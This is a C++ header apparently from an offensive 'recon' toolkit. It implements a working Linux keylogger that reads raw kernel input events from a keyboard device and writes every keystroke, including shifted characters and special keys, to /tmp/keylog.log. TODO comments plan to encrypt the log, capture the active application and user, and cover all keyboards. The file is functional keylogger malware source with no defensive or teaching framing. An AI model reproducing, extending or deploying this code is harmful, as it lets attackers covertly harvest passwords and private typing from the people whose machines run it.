#pragma once

#include <fcntl.h>
#include <fstream>
#include <ios>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

// TODO: Support other OSes and remove me
#define LINUX

#ifdef LINUX
#include <linux/input.h>
#endif

#include <log/log.h>

// TODO: Modify captures to adhere to this when application context and device enumeration done
/*
Captures should look like the following:

log_event = {
    time when;
    string user;
    string application;
    int proceoutfile_id;
    string log;
}
*/

using std::ios;
using std::ofstream;

namespace recon
{
    namespace collect
    {
        // TODO: Root check, otherwise use X window system for keylogging
        class keylogger
        {
          private:
            enum { RELEASED, PRESSED, REPEATED };

          public:
            /**
             * Log running host's keystrokes to file using kernel's input_events
             * @param file: keylog output file
             */
            static int keylog(const string& file = "/tmp/keylog.log")
            {
#ifdef LINUX
                // TODO: Encrypt logging
                // TODO: Find active application context if using X
                // TODO: Use mouse/interesting applications for more context if using X
                // TODO: Enumerate input devices that end with event-kbd and log all on separate threads/files.
                const char* dev = "/dev/input/by-path/pci-0000:00:14.0-usb-0:1.4.2:1.0-event-kbd";

                int file_descriptor;
                struct input_event prev;
                struct input_event event;
                bool exit_loop = false;
                bool shift_modifier = false;
                bool caps_lock = false;
                ofstream outfile;
                
                if ((file_descriptor = open(dev, O_RDONLY)) == -1)
                    log::fatal("Unable to open keyboard device");

                outfile.open(file, ios::out | ios::trunc);

                // TODO: Where is tilde/backtick?
                do {
                    prev = event;
                    read(file_descriptor, &event, sizeof(event));

                    // 0 = Released (shift only right now), 1 = Pressed, 2 = Repeated
                    if (event.type == EV_KEY && (event.value == PRESSED || event.value == REPEATED)) {
                        switch (event.code) {
                            case KEY_LEFTSHIFT:
                            case KEY_RIGHTSHIFT:
                                shift_modifier = true;
                                break;
                            case KEY_KP0:
                            case KEY_0:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "0"
                                                : ")");
                                break;
                            case KEY_KP1:
                                outfile << "1";
                                break;
                            case KEY_1:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "1"
                                                : "!");
                                break;
                            case KEY_KP2:
                                outfile << "2";
                                break;
                            case KEY_2:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "2"
                                                : "@");
                                break;
                            case KEY_KP3:
                                outfile << "3";
                                break;
                            case KEY_3:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "3"
                                                : "#");
                                break;
                            case KEY_KP4:
                                outfile << "4";
                                break;
                            case KEY_4:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "4"
                                                : "$");
                                break;
                            case KEY_KP5:
                                outfile << "5";
                                break;
                            case KEY_5:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "5"
                                                : "%");
                                break;
                            case KEY_KP6:
                                outfile << "6";
                                break;
                            case KEY_6:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "6"
                                                : "^");
                                break;
                            case KEY_KP7:
                                outfile << "7";
                                break;
                            case KEY_7:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "7"
                                                : "&");
                                break;
                            case KEY_KP8:
                                outfile << "8";
                                break;
                            case KEY_8:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "8"
                                                : "*");
                                break;
                            case KEY_KP9:
                                outfile << "9";
                                break;
                            case KEY_9:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "9"
                                                : "(");
                                break;
                            case KEY_A:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "a"
                                                : "A");
                                break;
                            case KEY_B:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "b"
                                                : "B");
                                break;
                            case KEY_C:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "c"
                                                : "C");
                                break;
                            case KEY_D:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "d"
                                                : "D");
                                break;
                            case KEY_E:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "e"
                                                : "E");
                                break;
                            case KEY_F:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "f"
                                                : "F");
                                break;
                            case KEY_G:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "g"
                                                : "G");
                                break;
                            case KEY_H:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "h"
                                                : "H");
                                break;
                            case KEY_I:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "i"
                                                : "I");
                                break;
                            case KEY_J:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "j"
                                                : "J");
                                break;
                            case KEY_K:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "k"
                                                : "K");
                                break;
                            case KEY_L:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "l"
                                                : "L");
                                break;
                            case KEY_M:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "m"
                                                : "M");
                                break;
                            case KEY_N:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "n"
                                                : "N");
                                break;
                            case KEY_O:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "o"
                                                : "O");
                                break;
                            case KEY_P:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "p"
                                                : "P");
                                break;
                            case KEY_Q:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "q"
                                                : "Q");
                                break;
                            case KEY_R:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "r"
                                                : "R");
                                break;
                            case KEY_S:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "s"
                                                : "S");
                                break;
                            case KEY_T:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "t"
                                                : "T");
                                break;
                            case KEY_U:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "u"
                                                : "U");
                                break;
                            case KEY_V:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "v"
                                                : "V");
                                break;
                            case KEY_W:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "w"
                                                : "W");
                                break;
                            case KEY_X:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "x"
                                                : "X");
                                break;
                            case KEY_Y:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "y"
                                                : "Y");
                                break;
                            case KEY_Z:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "z"
                                                : "Z");
                                break;
                            case KEY_MINUS:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "-"
                                                : "_");
                                break;
                            case KEY_EQUAL:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "="
                                                : "+");
                                break;
                            case KEY_BACKSPACE:
                                outfile << "<BKSPACE>";
                                break;
                            case KEY_TAB:
                                outfile << "<TAB>";
                                break;
                            case KEY_LEFTBRACE:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "["
                                                : "{");
                                break;
                            case KEY_RIGHTBRACE:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "]"
                                                : "}");
                                break;
                            case KEY_KPENTER:
                            case KEY_LINEFEED:
                            case KEY_ENTER:
                                outfile << "\n";
                                break;
                            case KEY_RIGHTCTRL:
                            case KEY_LEFTCTRL:
                                outfile << "<CTRL>";
                                break;
                            case KEY_SEMICOLON:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? ";"
                                                : ":");
                                break;
                            case KEY_APOSTROPHE:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "'"
                                                : "\"");
                                break;
                            case KEY_BACKSLASH:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "\\"
                                                : "|");
                                break;
                            case KEY_COMMA:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? ","
                                                : "<");
                                break;
                            case KEY_DOT:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "."
                                                : ">");
                                break;
                            case KEY_SLASH:
                                outfile << ((!shift_modifier && !caps_lock) || (caps_lock && shift_modifier)
                                                ? "/"
                                                : "?");
                                break;
                            case KEY_SPACE:
                                outfile << " ";
                                break;
                            case KEY_RIGHTALT:
                            case KEY_LEFTALT:
                                outfile << "<ALT>";
                                break;
                            case KEY_LEFTMETA:
                            case KEY_RIGHTMETA:
                                outfile << "<META>";
                                break;
                            case KEY_CAPSLOCK:
                                caps_lock = !caps_lock;
                                outfile << "<CAPS>";
                                break;
                            case KEY_HOME:
                                outfile << "<HOME>";
                                break;
                            case KEY_UP:
                                outfile << "<UP>";
                                break;
                            case KEY_LEFT:
                                outfile << "<LEFT>";
                                break;
                            case KEY_RIGHT:
                                outfile << "<RIGHT>";
                                break;
                            case KEY_END:
                                outfile << "<END>";
                                break;
                            case KEY_DOWN:
                                outfile << "<DOWN>";
                                break;
                            case KEY_INSERT:
                                outfile << "<INS>";
                                break;
                            case KEY_DELETE:
                                outfile << "<DEL>";
                                break;
                            case KEY_F1:
                                outfile << "<F1>";
                                break;
                            case KEY_F2:
                                outfile << "<F2>";
                                break;
                            case KEY_F3:
                                outfile << "<F3>";
                                break;
                            case KEY_F4:
                                outfile << "<F4>";
                                break;
                            case KEY_F5:
                                outfile << "<F5>";
                                break;
                            case KEY_F6:
                                outfile << "<F6>";
                                break;
                            case KEY_F7:
                                outfile << "<F7>";
                                break;
                            case KEY_F8:
                                outfile << "<F8>";
                                break;
                            case KEY_F9:
                                outfile << "<F9>";
                                break;
                            case KEY_F11:
                                outfile << "<F11>";
                                break;
                            case KEY_F12:
                                outfile << "<F12>";
                                break;
                            case KEY_KPPLUSMINUS:
                                outfile << "<KP +/->";
                                break;
                            case KEY_KPCOMMA:
                                outfile << ",";
                                break;
                            case KEY_KPMINUS:
                                outfile << "-";
                                break;
                            case KEY_KPDOT:
                                outfile << ".";
                                break;
                            case KEY_KPASTERISK:
                                outfile << "*";
                                break;
                            case KEY_KPSLASH:
                                outfile << "/";
                                break;
                            // FIXME: Remove when out of development
                            case KEY_ESC:
                                exit_loop = true;
                                break;
                            default:
                                break;
                        }
                    } else if (event.type == EV_KEY && event.value == RELEASED &&
                               (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT)) {
                        shift_modifier = false;
                    }

                    // Immediately flush contents to logfile
                    outfile.flush();
                } while (!exit_loop);

                outfile.close();
                close(file_descriptor);
                fflush(stdout);
                return 0;
#else
                return EXIT_FAILURE;
#endif
            }
        }; // namespace collect
    }      // namespace collect
} // namespace recon
